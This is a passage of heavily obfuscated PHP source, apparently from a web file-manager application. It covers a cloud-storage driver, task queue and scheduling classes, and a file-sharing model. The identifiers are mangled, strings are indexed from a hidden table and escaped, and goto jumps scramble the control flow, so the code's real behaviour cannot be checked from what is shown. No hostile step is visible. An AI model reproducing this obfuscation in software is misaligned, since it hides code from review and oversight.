$Šı™ì”[$Æ›’ŒÉ£[1455]]); $Á¼ˆËù– = $this->ussRequest($øÏéŠªÚ, $Æ›’ŒÉ£[223], $¾Ç¾ÇŒ©, $×µûÍ´); return !$Á¼ˆËù–[$Æ›’ŒÉ£[1165]] ? $Á¼ˆËù–[$Æ›’ŒÉ£[1165]] : $Á¼ˆËù–[$Æ›’ŒÉ£[1167]]; } public function uploadFormData($±²©óëî, $ôØğÌ‡‚ = 3600) { return $this->uploadPolicy($±²©óëî, $ôØğÌ‡‚); } public function multiUploadFormData($Ï™ºÇ©Ë, $¶ÄÃ“Ô = 3600) { $ÚÅŒËõ =& $_SERVER[ì…™Î¶Ï]; $µıöÛ¤ = (int) $GLOBALS[$ÚÅŒËõ[7]][$ÚÅŒËõ[80]]; return $this->uploadPolicy($Ï™ºÇ©Ë, $¶ÄÃ“Ô, $µıöÛ¤); } private function uploadPolicy($õ¤ì•ô, $ªà»çŒ = 3600, $»å÷œÁ = 0) { $£°ú´ìİ =& $_SERVER[ì…™Î¶Ï]; $¢Æƒ÷œ÷ = $£°ú´ìİ[8] . $this->bucket; $ü¬Ä¾ÇÕ = gmdate($£°ú´ìİ[1394]); $ĞÑ­£Óé = array($£°ú´ìİ[1461] => $this->bucket, $£°ú´ìİ[1462] => $õ¤ì•ô, $£°ú´ìİ[1463] => time() + $ªà»çŒ, $£°ú´ìİ[1464] => $ü¬Ä¾ÇÕ); if ($»å÷œÁ) { $ĞÑ­£Óé[$£°ú´ìİ[1374]] = $»å÷œÁ; } $©Ë†ĞÃ½ = base64_encode(json_encode($ĞÑ­£Óé)); $“çâ¶àß = base64_encode(hash_hmac($£°ú´ìİ[1431], "\x50\x4f\x53\124\46{$¢Æƒ÷œ÷}\46{$ü¬Ä¾ÇÕ}\x26{$©Ë†ĞÃ½}", md5("{$this->userpass}"), !0)); $şÊ´‚‡Ó = array($£°ú´ìİ[1296] => $©Ë†ĞÃ½, $£°ú´ìİ[1465] => "\125\x50\131\x55\x4e\40{$this->username}\72{$“çâ¶àß}", $£°ú´ìİ[174] => $this->endpoint . $¢Æƒ÷œ÷); return $şÊ´‚‡Ó; } public function download($…‚è«†­, $†îß†¡) { $âÆ˜€ï = IO::getPathInner(IO::mkfile($†îß†¡)); if (!($ëÇ´—ØŠ = $this->link($…‚è«†­))) { return !1; } $Åœï¤»ª = 0; $™î“¹ÈÃ = 1024 * 200; $ÒãüçÉÊ = fopen($âÆ˜€ï, $_SERVER[ì…™Î¶Ï][1415]); while (!0) { $³¶ŒÆÊ² = $this->fileSubstr($…‚è«†­, $Åœï¤»ª, $™î“¹ÈÃ); if ($³¶ŒÆÊ² === !1) { return !1; } fwrite($ÒãüçÉÊ, $³¶ŒÆÊ²); $Åœï¤»ª += $™î“¹ÈÃ; if (strlen($³¶ŒÆÊ²) < $™î“¹ÈÃ) { break; } } fclose($ÒãüçÉÊ); return $†îß†¡; } public function link($’Ğñø¾, $àñÁñÚ• = array()) { $Ìâ§ç¶’ =& $_SERVER[ì…™Î¶Ï]; $’Ğñø¾ = trim($’Ğñø¾, $Ìâ§ç¶’[8]); if (!empty($this->token)) { $õ›¡¼Ì = strtotime(date($Ìâ§ç¶’[1466])); $ĞÏ‹çÖ = substr(md5($this->token . $Ìâ§ç¶’[279] . $õ›¡¼Ì . $Ìâ§ç¶’[1467] . $’Ğñø¾), 12, 8) . $õ›¡¼Ì; $àñÁñÚ•[] = $Ìâ§ç¶’[1468] . $ĞÏ‹çÖ; } $Èè‘‹ğ = !empty($àñÁñÚ•) ? $Ìâ§ç¶’[73] . implode($Ìâ§ç¶’[279], $àñÁñÚ•) : $Ìâ§ç¶’[12]; return $this->getHost() . $Ìâ§ç¶’[8] . $’Ğñø¾ . $Èè‘‹ğ; } public function fileOut($Ÿ’õÈ­ñ, $î‡‚ø¹ = false, $Èõùû›ª = false, $ààˆ äˆ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Ÿ’õÈ­ñ, $î‡‚ø¹, $Èõùû›ª, $ààˆ äˆ); } if (!$Èõùû›ª) { $Èõùû›ª = $this->pathThis($Ÿ’õÈ­ñ); } $Èµ¾Æˆï = $î‡‚ø¹ ? array($_SERVER[ì…™Î¶Ï][1469] . rawurlencode($Èõùû›ª)) : array(); $¾ü ôß = $this->link($Ÿ’õÈ­ñ, $Èµ¾Æˆï); $this->fileOutLink($¾ü ôß); } public function fileOutServer($š…ù¯›â, $Ã§œ¢ä = false, $ìˆÔÁÍ = false, $¤Å‚•‰ = '') { parent::fileOut($š…ù¯›â, $Ã§œ¢ä, $ìˆÔÁÍ, $¤Å‚•‰); } public function fileOutImage($Òƒã‚‡ª, $£ªä»¯ğ = 250) { $”­Ëïù“ = $this->link($Òƒã‚‡ª . $_SERVER[ì…™Î¶Ï][1470] . $£ªä»¯ğ); $this->fileOutLink($”­Ëïù“); } public function fileOutImageServer($ÛªÏ­÷Ì, $€ÁÑÎÀü = 250) { parent::fileOutImage($ÛªÏ­÷Ì, $€ÁÑÎÀü); } public function hashMd5($›²øÙ®Ÿ) { $–—Éî÷… =& $_SERVER[ì…™Î¶Ï]; $×ó˜®ÄÆ = $this->_objectMeta($›²øÙ®Ÿ); return isset($×ó˜®ÄÆ[$–—Éî÷…[207]]) ? $×ó˜®ÄÆ[$–—Éî÷…[207]] : !1; } public function size($†İŸ³¹õ) { $‚»×¶ÉŸ = $this->objectMeta($†İŸ³¹õ); return $‚»×¶ÉŸ ? $‚»×¶ÉŸ[$_SERVER[ì…™Î¶Ï][80]] : 0; } public function info($®²­íÅÎ) { if ($this->isFolder($®²­íÅÎ)) { return $this->folderInfo($®²­íÅÎ); } else { if ($this->isFile($®²­íÅÎ)) { return $this->fileInfo($®²­íÅÎ); } } return !1; } public function exist($¨­óÃÑ˜) { return $this->isFile($¨­óÃÑ˜) || $this->isFolder($¨­óÃÑ˜); } public function isFile($¤ö­äû·) { return !$this->isFolder($¤ö­äû·) && $this->objectMeta($¤ö­äû·); } public function isFolder($»ÃºÆÍó) { return $this->cacheMethod($_SERVER[ì…™Î¶Ï][198], $»ÃºÆÍó); } protected function objectMeta($È›á‚Ù) { return $this->cacheMethod($_SERVER[ì…™Î¶Ï][199], $È›á‚Ù); } protected function _objectMeta($˜Îµ“‘Â) { $Œç €Áí =& $_SERVER[ì…™Î¶Ï]; if ($˜Îµ“‘Â == $Œç €Áí[12] || $˜Îµ“‘Â == $Œç €Áí[8]) { return array(); } $áÇ‹İšÇ = $this->ussRequest($˜Îµ“‘Â, $Œç €Áí[1471]); if (!$áÇ‹İšÇ[$Œç €Áí[1165]]) { return null; } $¦ıƒ¾ˆÔ = isset($áÇ‹İšÇ[$Œç €Áí[1167]]) ? $áÇ‹İšÇ[$Œç €Áí[1167]] : array(); if (!isset($¦ıƒ¾ˆÔ[$Œç €Áí[1472]])) { return null; } $À¦ú²ìª = array($Œç €Áí[33] => isset($¦ıƒ¾ˆÔ[$Œç €Áí[1472]]) ? $¦ıƒ¾ˆÔ[$Œç €Áí[1472]] : null, $Œç €Áí[80] => isset($¦ıƒ¾ˆÔ[$Œç €Áí[1473]]) ? $¦ıƒ¾ˆÔ[$Œç €Áí[1473]] : null, $Œç €Áí[207] => isset($¦ıƒ¾ˆÔ[$Œç €Áí[1474]]) ? $¦ıƒ¾ˆÔ[$Œç €Áí[1474]] : null, $Œç €Áí[1441] => isset($¦ıƒ¾ˆÔ[$Œç €Áí[1475]]) ? $¦ıƒ¾ˆÔ[$Œç €Áí[1475]] : null); $À¦ú²ìª[$Œç €Áí[1442]] = isset($¦ıƒ¾ˆÔ[$Œç €Áí[1476]]) ? strtotime($¦ıƒ¾ˆÔ[$Œç €Áí[1476]]) : $À¦ú²ìª[$Œç €Áí[1441]]; return $À¦ú²ìª; } protected function _isFolder($Ò£©ìÑ) { $ÍÉ¬³Ûí =& $_SERVER[ì…™Î¶Ï]; if ($Ò£©ìÑ == $ÍÉ¬³Ûí[12] || $Ò£©ìÑ == $ÍÉ¬³Ûí[8]) { return !0; } $æ¢£¸ÕÇ = $this->_objectMeta($Ò£©ìÑ); return isset($æ¢£¸ÕÇ[$ÍÉ¬³Ûí[33]]) && $æ¢£¸ÕÇ[$ÍÉ¬³Ûí[33]] == $ÍÉ¬³Ûí[79] ? !0 : !1; } } goto CØÃ÷×›»º; A¯Ñ“ ¤éÔ: class TaskHttp extends Task { protected function startAfter() { $îèİı¨¼ =& $_SERVER[ì…™Î¶Ï]; $Şü¬Í‚É =& $this->task; $Şü¬Í‚É[$îèİı¨¼[1702]] = 1; Hook::bind($îèİı¨¼[1671], array($this, $îèİı¨¼[1703])); Hook::bind($îèİı¨¼[1673], array($this, $îèİı¨¼[1704])); Hook::bind($îèİı¨¼[1675], array($this, $îèİı¨¼[1705])); } protected function endAfter() { $ÂïäÓ‡Á =& $_SERVER[ì…™Î¶Ï]; Hook::unbind($ÂïäÓ‡Á[1671], array($this, $ÂïäÓ‡Á[1703])); Hook::unbind($ÂïäÓ‡Á[1673], array($this, $ÂïäÓ‡Á[1704])); Hook::unbind($ÂïäÓ‡Á[1675], array($this, $ÂïäÓ‡Á[1705])); } public function progressStart($®’Ì‰³¯) { $ÉÀÎñ—¢ =& $_SERVER[ì…™Î¶Ï]; $ìıùïÆï = curl_getinfo($®’Ì‰³¯); self::log($ÉÀÎñ—¢[1706] . $ìıùïÆï[$ÉÀÎñ—¢[302]]); self::valueSet($this->task[$ÉÀÎñ—¢[392]], $this->task); } public function progressEnd($¦Â¶€’˜) { $‡½ÔèË =& $_SERVER[ì…™Î¶Ï]; self::log($‡½ÔèË[1707] . $this->task[$‡½ÔèË[392]]); $this->end(); } public function progress($«²ˆÈïü, $ùŸ›×Íì, $ï“ùÉÜ, $Œ©øğÛõ, $™óÁÎØ) { $—éÈƒÒÈ =& $_SERVER[ì…™Î¶Ï]; $–«ñåß =& $this->task; if ($™óÁÎØ > 0) { $–«ñåß[$—éÈƒÒÈ[761]] = $–«ñåß[$—éÈƒÒÈ[761]] == 0 ? $Œ©øğÛõ : $–«ñåß[$—éÈƒÒÈ[761]]; $–«ñåß[$—éÈƒÒÈ[1632]] = $™óÁÎØ; } else { if ($ï“ùÉÜ > 0) { $–«ñåß[$—éÈƒÒÈ[761]] = $–«ñåß[$—éÈƒÒÈ[761]] == 0 ? $ùŸ›×Íì : $–«ñåß[$—éÈƒÒÈ[761]]; $–«ñåß[$—éÈƒÒÈ[1632]] = $ï“ùÉÜ; } } $this->update(); self::log("\160\x72\x6f\147\162\145\163\x73\110\164\x74\x70\72\x64\157\167\156\x3a{$ï“ùÉÜ}\57{$ùŸ›×Íì}\73\x20\x75\x70\154\x6f\x61\144\72{$™óÁÎØ}\x2f{$Œ©øğÛõ}\73"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\153\121\165\x65\x75\145\x4c\145\156\x67\x74\150"; const QUEUE_DATA = "\164\x61\x73\153\121\165\x65\x75\x65\x44\x61\164\141"; public static $listData = false; public static function initTask() { } public static function add($÷ÁºØšä, $âè Õ·± = array(), $Ğá®§Î = '', $‡öş•Ùª = '') { $”×½òâù =& $_SERVER[ì…™Î¶Ï]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($‡öş•Ùª && array_find_by_field(self::$listData, $”×½òâù[95], $‡öş•Ùª)) { return !0; } self::$listData[] = array($”×½òâù[259] => $÷ÁºØšä, $”×½òâù[1708] => $âè Õ·±, $”×½òâù[442] => $Ğá®§Î, $”×½òâù[95] => $‡öş•Ùª); return !0; } public static function addSubmit() { $ÖÙèãÖç =& $_SERVER[ì…™Î¶Ï]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($ÖÙèãÖç[1709] . json_encode_force(array_to_keyvalue(self::$listData, $ÖÙèãÖç[12], $ÖÙèãÖç[442])), $ÖÙèãÖç[1710]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($³‰Î±Š, $ÙÃÏ»Ù‡ = array(), $èº‚¿Ä = '', $ØÉµÔ± = '') { $­ãäã =& $_SERVER[ì…™Î¶Ï]; if (self::count() >= self::MAX_LENGTH) { return !1; } $å©Ù  œ = self::getAll(); if ($ØÉµÔ± && array_find_by_field($å©Ù  œ, $­ãäã[95], $ØÉµÔ±)) { return !0; } $å©Ù  œ[] = array($­ãäã[259] => $³‰Î±Š, $­ãäã[1708] => $ÙÃÏ»Ù‡, $­ãäã[442] => $èº‚¿Ä, $­ãäã[95] => $ØÉµÔ±); write_log($­ãäã[1709] . $èº‚¿Ä, $­ãäã[1710]); self::setAll($å©Ù  œ); return !0; } public static function run() { $€µı¥® =& $_SERVER[ì…™Î¶Ï]; $Ë²à„¬ = self::getAll(); $øíÚÑàõ = array_shift($Ë²à„¬); if (!$øíÚÑàõ) { return !1; } self::setAll($Ë²à„¬); $ò‘•€ÉÛ = timeFloat(); try { Hook::apply($øíÚÑàõ[$€µı¥®[259]], $øíÚÑàõ[$€µı¥®[1708]]); } catch (Exception $ï…ßê˜­) { } $ÔãİêÚ· = number_format(timeFloat() - $ò‘•€ÉÛ, 3) . $€µı¥®[1647]; write_log($€µı¥®[1711] . $øíÚÑàõ[$€µı¥®[442]] . $€µı¥®[1712] . $ÔãİêÚ·, $€µı¥®[1710]); return !0; } public static function count() { $ã‡´Œå¾ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$ã‡´Œå¾) { return 0; } return intval($ã‡´Œå¾); } public static function getAll() { $Ç‰¡éıÌ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$Ç‰¡éıÌ) { return array(); } return $Ç‰¡éıÌ; } public static function setAll($ó¼ÔÖÎ) { $Øİ‹È = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ó¼ÔÖÎ), $Øİ‹È); Cache::set(self::QUEUE_DATA, $ó¼ÔÖÎ, $Øİ‹È); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Á€áæ»×, $è®ã«Î× = 5.0) { if (!$Á€áæ»×) { return; } $ÀûåŸ±À = Cache::get($Á€áæ»×); if (!$ÀûåŸ±À || timeFloat() - floatVal($ÀûåŸ±À) >= $è®ã«Î×) { Cache::set($Á€áæ»×, timeFloat(), $è®ã«Î× * 10); return !0; } return !1; } public static function timeLimitCall($ºª»ÚÆì, $È«ı¶­, $™ã£¡¨ , $¬Æ¸Ñªô = 5.0) { $Ê§£’‚ä =& $_SERVER[ì…™Î¶Ï]; if (!$ºª»ÚÆì || !$È«ı¶­) { return; } self::$asyncAdd = !0; $ö‹åÑÛ¯ = $Ê§£’‚ä[1713]; $·ìµœ‡Ù = Cache::get($ö‹åÑÛ¯, !0); $Éé˜–¨ = array($Ê§£’‚ä[1714] => timeFloat(), $Ê§£’‚ä[1715] => timeFloat(), $Ê§£’‚ä[259] => $È«ı¶­, $Ê§£’‚ä[1708] => $™ã£¡¨ , $Ê§£’‚ä[196] => $¬Æ¸Ñªô); if (is_array($·ìµœ‡Ù[$ºª»ÚÆì])) { $Éé˜–¨[$Ê§£’‚ä[1715]] = $·ìµœ‡Ù[$ºª»ÚÆì][$Ê§£’‚ä[1715]]; } if (is_array($·ìµœ‡Ù[$ºª»ÚÆì])) { if (timeFloat() - $·ìµœ‡Ù[$ºª»ÚÆì][$Ê§£’‚ä[1714]] < $Éé˜–¨[$Ê§£’‚ä[196]] * 0.3) { return; } $Éé˜–¨[$Ê§£’‚ä[1715]] = $·ìµœ‡Ù[$ºª»ÚÆì][$Ê§£’‚ä[1715]]; } $·ìµœ‡Ù[$ºª»ÚÆì] = $Éé˜–¨; Cache::set($ö‹åÑÛ¯, $·ìµœ‡Ù, 60); Cache::removeMemory($ö‹åÑÛ¯); write_log($Ê§£’‚ä[1716] . $ºª»ÚÆì . $Ê§£’‚ä[71] . $È«ı¶­, $Ê§£’‚ä[1710]); } public static function timeLimitCallLoop() { $Èó©‹­¯ =& $_SERVER[ì…™Î¶Ï]; $¹Ä€„Ë = array($Èó©‹­¯[1717]); $†úëÈ¹É = in_array(strtolower(ACTION), $¹Ä€„Ë); if (!$†úëÈ¹É && !self::$asyncAdd) { return; } $‡ß„Ó¶‘ = $Èó©‹­¯[1713]; $²ÇÏ‹ê = Cache::get($‡ß„Ó¶‘, !0); if (!$²ÇÏ‹ê || count($²ÇÏ‹ê) <= 0) { return; } $ê’ï­ = !1; $”Ôª‡Êè = timeFloat(); $—ƒÆ¢ŸÕ = array(); foreach ($²ÇÏ‹ê as $›¥İÚ¿… => $ÚíúÒ®ó) { if ($”Ôª‡Êè - $ÚíúÒ®ó[$Èó©‹­¯[1715]] > $ÚíúÒ®ó[$Èó©‹­¯[196]]) { $ê’ï­ = !0; try { Hook::apply($ÚíúÒ®ó[$Èó©‹­¯[259]], $ÚíúÒ®ó[$Èó©‹­¯[1708]]); write_log($Èó©‹­¯[1718] . $›¥İÚ¿… . $Èó©‹­¯[71] . $ÚíúÒ®ó[$Èó©‹­¯[259]] . $Èó©‹­¯[1719] . ACTION, $Èó©‹­¯[1710]); } catch (Exception $µ°ö½„) { } continue; } $—ƒÆ¢ŸÕ[$›¥İÚ¿…] = $ÚíúÒ®ó; } if (!$ê’ï­) { return; } if (!$—ƒÆ¢ŸÕ) { return Cache::remove($‡ß„Ó¶‘); } Cache::set($‡ß„Ó¶‘, $—ƒÆ¢ŸÕ, 60); Cache::removeMemory($‡ß„Ó¶‘); } public static function finished($‰ß¤Ó‰, $èœÌºñ•) { $æÛèøö =& $_SERVER[ì…™Î¶Ï]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($æÛèøö[259] => $‰ß¤Ó‰, $æÛèøö[1708] => $èœÌºñ•); } private static function finishedRun() { $‘æÈòãú =& $_SERVER[ì…™Î¶Ï]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Û”ëä”) { try { Hook::apply($Û”ëä”[$‘æÈòãú[259]], $Û”ëä”[$‘æÈòãú[1708]]); } catch (Exception $Ä¹¼÷Ûë) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto E‰Ê”ç•³¢; eÚæ®Ü—Ê: class ShareModel extends ModelBase { protected $tableName = "\163\150\141\x72\x65"; protected $dataAuto = array(array("\155\x6f\x64\x69\146\171\x54\151\x6d\x65", "\164\151\x6d\x65", "\x69\156\163\x65\162\164\54\x75\160\x64\141\164\x65", "\146\x75\x6e\143\x74\x69\x6f\156"), array("\143\162\145\141\164\x65\x54\x69\155\x65", "\x74\x69\155\x65", "\151\x6e\x73\145\x72\x74", "\x66\165\156\x63\x74\x69\x6f\156"), array("\157\x70\x74\x69\157\156\x73", '', "\151\156\x73\x65\162\164\54\x75\x70\144\141\164\x65\54\x73\x65\154\145\143\164", "\152\163\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($î¦çÜİ¥) { $ğú½²¿Ø =& $_SERVER[ì…™Î¶Ï]; $»¬Ù›Ğ = isset($î¦çÜİ¥[0]) ? $î¦çÜİ¥[0] : !1; return array($ğú½²¿Ø[1933] => array(USER_ID, $ğú½²¿Ø[1934]), $ğú½²¿Ø[1878] => array($»¬Ù›Ğ, $ğú½²¿Ø[1935])); } protected function listSimple() { $©Ÿ¼¬ = array($_SERVER[ì…™Î¶Ï][1631] => USER_ID); $‚«’É­É = $this->field($this->fieldList)->where($©Ÿ¼¬)->select(); return $‚«’É­É ? $‚«’É­É : array(); } protected function getInfo($Ççá”º , $÷ïÎ¶®ï = false) { $›íŠÛÌá =& $_SERVER[ì…™Î¶Ï]; if ($÷ïÎ¶®ï) { return $this->_getShareInfo(array($›íŠÛÌá[479] => $Ççá”º )); } $Í®Ø”êÔ = $this->cacheFunctionGet($›íŠÛÌá[1880], $Ççá”º ); return $Í®Ø”êÔ; } public function getInfoByHash($Óï”¹Ûƒ) { return $this->_getShareInfo(array($_SERVER[ì…™Î¶Ï][481] => $Óï”¹Ûƒ)); } public function getInfoByPath($ĞØäíö°) { $‡Œ·ô“Õ =& $_SERVER[ì…™Î¶Ï]; $ĞÄ”½Ä = array($‡Œ·ô“Õ[1631] => USER_ID, $‡Œ·ô“Õ[394] => $ĞØäíö°); return $this->_getShareInfo($ĞÄ”½Ä); } public function getInfoBySourcePath($öş™ó») { $¬ÂùÄÄ¾ =& $_SERVER[ì…™Î¶Ï]; $ÌíôÆ = array($¬ÂùÄÄ¾[1631] => USER_ID, $¬ÂùÄÄ¾[1150] => $öş™ó»); return $this->_getShareInfo($ÌíôÆ); } private function _getShareInfo($Şö¿Å×) { $ëÀÜåÏÒ =& $_SERVER[ì…™Î¶Ï]; $—ÊöŸ = $this->where($Şö¿Å×)->find(); if (!$—ÊöŸ) { return !1; } $Şö¿Å× = array($ëÀÜåÏÒ[479] => $—ÊöŸ[$ëÀÜåÏÒ[479]]); $®âêÃÓ¬ = $ëÀÜåÏÒ[1936]; $Ö°Ô§ë = Model($ëÀÜåÏÒ[587])->order($ëÀÜåÏÒ[392])->field($®âêÃÓ¬)->where($Şö¿Å×)->select(); if ($—ÊöŸ[$ëÀÜåÏÒ[394]] == $ëÀÜåÏÒ[190]) { $—ÊöŸ[$ëÀÜåÏÒ[87]] = IO::info($—ÊöŸ[$ëÀÜåÏÒ[1150]]); } else { $—ÊöŸ[$ëÀÜåÏÒ[87]] = Model($ëÀÜåÏÒ[1301])->pathInfo($—ÊöŸ[$ëÀÜåÏÒ[394]]); } $—ÊöŸ[$ëÀÜåÏÒ[1937]] = $Ö°Ô§ë; return $—ÊöŸ; } protected function getInfoAuth($çá—­) { $’Å–œ‰ş =& $_SERVER[ì…™Î¶Ï]; $Âö‰šÉ = $this->getInfo($çá—­); if ($Âö‰šÉ[$’Å–œ‰ş[1631]] == USER_ID) { $Âö‰šÉ[$’Å–œ‰ş[405]] = $Âö‰šÉ[$’Å–œ‰ş[87]][$’Å–œ‰ş[405]]; } else { $Âö‰šÉ[$’Å–œ‰ş[405]] = Model($’Å–œ‰ş[493])->authMake($Âö‰šÉ[$’Å–œ‰ş[1937]]); } return $Âö‰šÉ; } protected function listData($Ê‘¾í½Ê = null, $Ğ›âŠÑ = 300) { $İ×Ò€Æ¿ =& $_SERVER[ì…™Î¶Ï]; $›¼»Ğ«È = array(array($İ×Ò€Æ¿[484] => array($İ×Ò€Æ¿[988], 0), $İ×Ò€Æ¿[486] => array($İ×Ò€Æ¿[988], 0), $İ×Ò€Æ¿[1938] => $İ×Ò€Æ¿[1894])); if ($Ê‘¾í½Ê == $İ×Ò€Æ¿[1939]) { $›¼»Ğ«È = array($İ×Ò€Æ¿[484] => 1); } else { if ($Ê‘¾í½Ê == $İ×Ò€Æ¿[1135]) { $›¼»Ğ«È = array($İ×Ò€Æ¿[486] => 1); } } $›¼»Ğ«È[$İ×Ò€Æ¿[1631]] = USER_ID; $Ë¸œ¨¦ = $this->where($›¼»Ğ«È)->selectPage($Ğ›âŠÑ); return $Ë¸œ¨¦; } protected function listToMe($ı¢ ×Ãí = 300) { $‡êª‰Ÿ =& $_SERVER[ì…™Î¶Ï]; $ÄŠ±×ãÓ = Model($‡êª‰Ÿ[1940])->userGroupParents(USER_ID); $ˆ‹“Üì = array($‡êª‰Ÿ[571] => SourceModel::TYPE_USER, $‡êª‰Ÿ[495] => USER_ID); if ($ÄŠ±×ãÓ) { $ˆ‹“Üì = array(array($‡êª‰Ÿ[571] => SourceModel::TYPE_USER, $‡êª‰Ÿ[495] => USER_ID), array($‡êª‰Ÿ[571] => SourceModel::TYPE_GROUP, $‡êª‰Ÿ[495] => array($‡êª‰Ÿ[7], $ÄŠ±×ãÓ)), $‡êª‰Ÿ[1938] => $‡êª‰Ÿ[1894]); } $ûˆ¡¹ŸŞ = Model($‡êª‰Ÿ[587])->where($ˆ‹“Üì)->selectPage($ı¢ ×Ãí); $‡ÔÆÚ‹Ş = array_to_keyvalue_group($ûˆ¡¹ŸŞ[$‡êª‰Ÿ[364]], $‡êª‰Ÿ[479]); if (!$‡ÔÆÚ‹Ş) { return $ûˆ¡¹ŸŞ; } $²©²ãºÅ = $‡êª‰Ÿ[1941]; $ˆ‹“Üì = array($‡êª‰Ÿ[479] => array($‡êª‰Ÿ[410], array_keys($‡ÔÆÚ‹Ş)), $‡êª‰Ÿ[1631] => array($‡êª‰Ÿ[990], $‡êª‰Ÿ[190])); $ÁÓû¸¡± = $this->field($²©²ãºÅ)->where($ˆ‹“Üì)->select(); foreach ($ÁÓû¸¡± as $â…ÄäŠò => &$¿–´ÚŠ·) { $¿–´ÚŠ·[$‡êª‰Ÿ[1937]] = $‡ÔÆÚ‹Ş[$¿–´ÚŠ·[$‡êª‰Ÿ[479]]]; } unset($¿–´ÚŠ·); $ÓğãñÁõ = array($‡êª‰Ÿ[1942] => $ÁÓû¸¡±, $‡êª‰Ÿ[1943] => $ûˆ¡¹ŸŞ[$‡êª‰Ÿ[361]]); return $ÓğãñÁõ; } protected function shareAdd($èíÕ²Ú, $É…ÀÛ¯Á) { $ùÃªû× =& $_SERVER[ì…™Î¶Ï]; $áÙ‘ó‡Ã = $this->_addShareData($èíÕ²Ú, $É…ÀÛ¯Á); if (!empty($É…ÀÛ¯Á[$ùÃªû×[1944]])) { $this->_shareAuthSet($áÙ‘ó‡Ã, $É…ÀÛ¯Á[$ùÃªû×[1944]]); } $this->shareEventAdd($èíÕ²Ú, $É…ÀÛ¯Á, $ùÃªû×[1138]); return $áÙ‘ó‡Ã; } protected function shareAddSystem($Û³¸î¯ë, $‰—áÈü) { $şÁÜªÕª =& $_SERVER[ì…™Î¶Ï]; $¦çŞ½ÀÅ = $this->_addShareData($Û³¸î¯ë, $‰—áÈü, $şÁÜªÕª[1250]); $this->_shareAuthSet($¦çŞ½ÀÅ, $‰—áÈü[$şÁÜªÕª[1944]]); return $¦çŞ½ÀÅ; } private function shareEventAdd($™ó©©‘, $Ğˆéû¦‘, $ã¹¶Ú¤Ó = "\141\x64\x64") { $±ŒË…µ¶ =& $_SERVER[ì…™Î¶Ï]; if (!$™ó©©‘ || $™ó©©‘ == $±ŒË…µ¶[190]) { return; } if ($ã¹¶Ú¤Ó == $±ŒË…µ¶[1138]) { if ($Ğˆéû¦‘[$±ŒË…µ¶[484]] == $±ŒË…µ¶[89]) { Model($±ŒË…µ¶[555])->eventShare($™ó©©‘, $±ŒË…µ¶[1945]); } if ($Ğˆéû¦‘[$±ŒË…µ¶[486]] == $±ŒË…µ¶[89]) { Model($±ŒË…µ¶[555])->eventShare($™ó©©‘, $±ŒË…µ¶[1946]); } return; } $Ñâ”ù…¤ = $this->getInfoByPath($™ó©©‘); $ÊÏ€”‹ = $±ŒË…µ¶[1947]; if ($Ñâ”ù…¤[$±ŒË…µ¶[484]] == $±ŒË…µ¶[190] && $Ğˆéû¦‘[$±ŒË…µ¶[484]] == $±ŒË…µ¶[89]) { $ÊÏ€”‹ = $±ŒË…µ¶[1945]; } if ($Ñâ”ù…¤[$±ŒË…µ¶[484]] == $±ŒË…µ¶[89] && $Ğˆéû¦‘[$±ŒË…µ¶[484]] == $±ŒË…µ¶[190]) { $ÊÏ€”‹ = $±ŒË…µ¶[1948]; } if ($Ñâ”ù…¤[$±ŒË…µ¶[486]] == $±ŒË…µ¶[190] && $Ğˆéû¦‘[$±ŒË…µ¶[486]] == $±ŒË…µ¶[89]) { $ÊÏ€”‹ = $±ŒË…µ¶[1946]; } if ($Ñâ”ù…¤[$±ŒË…µ¶[486]] == $±ŒË…µ¶[89] && $Ğˆéû¦‘[$±ŒË…µ¶[486]] == $±ŒË…µ¶[190]) { $ÊÏ€”‹ = $±ŒË…µ¶[1949]; } Model($±ŒË…µ¶[555])->eventShare($™ó©©‘, $ÊÏ€”‹); return; } private function _addShareData($‹ÍÏŞÑß, $‚â©£Ö» = array(), $½ü®èÛú = false) { $Ğ¢ÑÍ¡Í =& $_SERVER[ì…™Î¶Ï]; $šİàÌï£ = $½ü®èÛú == $Ğ¢ÑÍ¡Í[1250] ? 0 : USER_ID; $€ÆØåôÈ = array($Ğ¢ÑÍ¡Í[409] => $‹ÍÏŞÑß, $Ğ¢ÑÍ¡Í[1622] => $šİàÌï£); if ($‹ÍÏŞÑß == 0) { $€ÆØåôÈ = array($Ğ¢ÑÍ¡Í[1950] => $‚â©£Ö»[$Ğ¢ÑÍ¡Í[1150]], $Ğ¢ÑÍ¡Í[1622] => $šİàÌï£); } if ($±Õ€”‹± = $this->where($€ÆØåôÈ)->find()) { return $±Õ€”‹±[$Ğ¢ÑÍ¡Í[479]]; } if ($‹ÍÏŞÑß == 0) { $×—ßÎ±ó = array($Ğ¢ÑÍ¡Í[32] => get_path_this($‚â©£Ö»[$Ğ¢ÑÍ¡Í[78]])); } else { $×—ßÎ±ó = Model($Ğ¢ÑÍ¡Í[800])->sourceInfo($‹ÍÏŞÑß); if (!$×—ßÎ±ó) { return !1; } } if (!$‚â©£Ö»[$Ğ¢ÑÍ¡Í[1531]]) { $‚â©£Ö»[$Ğ¢ÑÍ¡Í[1531]] = $×—ßÎ±ó[$Ğ¢ÑÍ¡Í[32]]; } $Ï…Åè = array($Ğ¢ÑÍ¡Í[1622] => $šİàÌï£, $Ğ¢ÑÍ¡Í[409] => $‹ÍÏŞÑß, $Ğ¢ÑÍ¡Í[1531] => $Ğ¢ÑÍ¡Í[12], $Ğ¢ÑÍ¡Í[484] => 0, $Ğ¢ÑÍ¡Í[486] => 0, $Ğ¢ÑÍ¡Í[1150] => $Ğ¢ÑÍ¡Í[12], $Ğ¢ÑÍ¡Í[302] => $Ğ¢ÑÍ¡Í[12], 